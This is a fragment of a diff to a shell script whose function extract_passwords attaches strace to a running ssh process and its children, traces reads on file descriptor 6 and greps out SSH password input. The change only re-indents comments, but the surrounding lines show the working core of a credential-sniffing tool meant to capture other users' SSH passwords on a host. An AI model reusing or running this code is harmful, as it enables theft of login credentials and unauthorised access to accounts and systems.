@@ -11,11 +11,11 @@ get_ssh_pid() {
 
 
 extract_passwords() {
-	# attach strace to the parent ssh process, it will follow children
-	# parse for read() type 6 output
-	# push stderr into stdout
-	# line buffer grep for patterns matching ssh password reads
-	# parse extraneous debug output away
+# attach strace to the parent ssh process, it will follow children
+# parse for read() type 6 output
+# push stderr into stdout
+# line buffer grep for patterns matching ssh password reads
+# parse extraneous debug output away
 
 	strace -e trace=read -e read=6 -f -p $ssh_pid 2>&1 >/dev/null|
 	grep --line-buffered "read(6,"|
